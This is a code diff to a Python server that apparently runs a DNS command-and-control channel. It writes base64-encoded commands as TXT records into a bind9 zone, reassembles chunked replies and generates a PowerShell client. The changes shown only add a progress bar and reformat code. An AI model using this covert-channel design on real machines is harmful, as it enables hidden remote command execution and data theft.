@@ -88,7 +88,11 @@ def getData(code, counter):
                     data[thisdata[3]][int(thisdata[1])
                                       ] = thisdata[0].replace("_", "=")
 
+                    print_progress(len(data[thisdata[3]]), int(thisdata[2]), prefix='Progress:', suffix='Complete', bar_length=50)
                     if len(data[thisdata[3]]) == int(thisdata[2]):
+                        # Clear progress_bar (remove last line in terminal)
+                        
+                        
                         #print("--------------------- Data recieved ---------------------")
                         # Put the data together in one variable
                         datastring = ""
@@ -98,7 +102,7 @@ def getData(code, counter):
                         # decode base64
                         decoded = base64_decode_string(datastring)
                         # JSON decode
-                        print(f"JSON: {decoded}")
+                        #print(f"JSON: {decoded}")
                         response = json.loads(decoded)
                         return response
                         waitingfordata = False
@@ -115,7 +119,7 @@ def getData(code, counter):
 def generateClient():
     # Function to generate client
     print("Generating client... for domain {domain}")
-        # Read client-preset.ps1
+    # Read client-preset.ps1
     with open('client-preset.ps1', 'r') as f:
         content = f.read()
 
@@ -123,7 +127,8 @@ def generateClient():
     content = content.replace('{domain}', domain)
 
     # prompt the user for the path, defaults to to "./client.ps1"
-    path = input('Enter the path to export the file (default: ./client.ps1): ') or './client.ps1'
+    path = input(
+        'Enter the path to export the file (default: ./client.ps1): ') or './client.ps1'
 
     # export the file to the path specified
     with open(path, 'w') as f:
@@ -137,9 +142,12 @@ def generateClient():
         pass
     else:
         main()
+
+
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--generate-client", action="store_true", help="Generates the .ps1 client file")
+    parser.add_argument("--generate-client", action="store_true",
+                        help="Generates the .ps1 client file")
     args = parser.parse_args()
 
     if args.generate_client:
@@ -177,7 +185,8 @@ def main():
             command = base64_encode_string(command)
 
             zone = open(filename, "a")
-            zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
+            zone.write(
+                f"""{counter}.{code}       IN      TXT      {command}\n""")
             zone.close()
 
             reloadrnc = 'docker-compose -f "../docker-compose.yml" exec bind9 rndc reload'
@@ -195,6 +204,34 @@ def main():
                 print(output)
 
             counter += 1
+
+
+def print_progress(iteration, total, prefix='', suffix='', decimals=1, bar_length=100):
+    """
+    Call in a loop to create terminal progress bar
+    @params:
+        iteration   - Required  : current iteration (Int)
+        total       - Required  : total iterations (Int)
+        prefix      - Optional  : prefix string (Str)
+        suffix      - Optional  : suffix string (Str)
+        decimals    - Optional  : positive number of decimals in percent complete (Int)
+        bar_length  - Optional  : character length of bar (Int)
+    """
+    str_format = "{0:." + str(decimals) + "f}"
+    percents = str_format.format(100 * (iteration / float(total)))
+    filled_length = int(round(bar_length * iteration / float(total)))
+    bar = '█' * filled_length + '-' * (bar_length - filled_length)
+
+    if iteration == total:
+        # Remove progress bar 
+        sys.stdout.write('\x1b[2K')
+    else:
+        sys.stdout.write('\r%s |%s| %s%s %s' %
+                         (prefix, bar, percents, '%', suffix))
+
+    if iteration == total:
+        sys.stdout.write('\n')
+    sys.stdout.flush()
 
 
 if __name__ == "__main__":
